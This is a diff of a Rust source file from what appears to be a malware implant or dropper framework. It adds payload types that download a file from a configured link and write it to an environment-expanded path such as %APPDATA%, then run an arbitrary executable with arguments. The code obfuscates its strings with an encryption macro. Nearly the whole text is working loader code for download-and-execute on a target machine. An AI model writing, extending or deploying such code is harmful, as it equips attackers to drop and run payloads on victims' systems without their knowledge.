@@ -5,10 +5,9 @@ type DllEntryPoint = extern "C" fn() -> c_int;
 #[cfg(target_os = "windows")]
 use std::mem;
 
+use serde::{Deserialize, Serialize};
 #[cfg(target_os = "linux")]
 use std::os::unix::fs::PermissionsExt;
-
-use serde::{Deserialize, Serialize};
 
 use rand::Rng;
 use std::fs;
@@ -42,6 +41,8 @@ pub enum Payload {
     ExecPython(ExecPython),
     Banner(),
     Empty(Empty),
+    DownloadFile(WriteFile),
+    Exec(Exec),
 }
 impl Payload {
     pub fn exec_payload(&self) {
@@ -52,6 +53,8 @@ impl Payload {
             Payload::ExecPython(payload) => payload.deploy_embedder(),
             Payload::Banner() => Ok(banner()),
             Payload::Empty(payload) => Ok(payload.void()),
+            Payload::DownloadFile(payload) => payload.download_file(),
+            Payload::Exec(payload) => payload.exec_file(),
         };
         match exec_result {
             Ok(_) => {}
@@ -299,4 +302,80 @@ pub fn basename(out_filepath: &String) -> String {
     let path = Path::new(out_filepath);
     let filename = path.file_name().unwrap();
     filename.to_str().unwrap().to_string()
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct WriteFile {
+    pub link: Link,
+    pub path: String,
+    //pub out_overwrite: bool,
+    //random name... mais il faut trouver un moyen pour passer la value aux payloads suivantes.
+}
+use std::fs::File;
+//use std::io::Write;
+use std::fs::create_dir_all;
+//use std::path::Path;
+use shellexpand;
+
+impl WriteFile {
+    pub fn download_file(&self) -> Result<(), anyhow::Error> {
+        let body: Vec<u8> = self.link.fetch_data()?;
+        //let data_write_path = self.write_file(body)?;
+        //TODO calculate the PATH, create
+        let path: PathBuf = calculate_path(&self.path)?;
+        let _ = create_diretory(&path);
+
+        let mut f = File::create(&path)?;
+        info!("[+] Write file: {:?}", path);
+        f.write_all(&body)?;
+        Ok(())
+    }
+}
+
+pub fn calculate_path(path_with_env: &String) -> Result<PathBuf, anyhow::Error> {
+    let expanded = shellexpand::env(path_with_env)?; // Expands %APPDATA% or any other environment variable
+    let path: &Path = Path::new(&*expanded); // Convert to a Path
+    debug!("Expanded Path: {:?}", path);
+    Ok(path.to_owned())
+}
+
+pub fn create_diretory(path: &PathBuf) -> Result<(), anyhow::Error> {
+    match path.parent() {
+        Some(parent_dir) => {
+            if fs::metadata(parent_dir).is_ok() == false {
+                info!("[+] path not exist, create: {:?}", parent_dir);
+                create_dir_all(parent_dir)?;
+            }
+        }
+        None => error!(
+            "{}{:?}",
+            encrypt_string!("error, impossible to retreive parent path: "),
+            path
+        ),
+    };
+    Ok(())
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct Exec {
+    pub path: String,
+    pub cmdline: String,
+}
+impl Exec {
+    // https://doc.rust-lang.org/std/process/struct.Command.html
+    pub fn exec_file(&self) -> Result<(), anyhow::Error> {
+        let path: PathBuf = calculate_path(&self.path)?;
+        info!("Exec {:?} {}",&path,&self.cmdline);
+        let mut comm = Command::new(&path);
+
+        for i in self.cmdline.trim().split_whitespace() {
+            comm.arg(i);
+        }
+        //   .args(["/C", "echo hello"])
+        let output = comm
+            .output()
+            .expect(&encrypt_string!("failed to execute process"));
+        let _hello: Vec<u8> = output.stdout;
+        Ok(())
+    }
 }
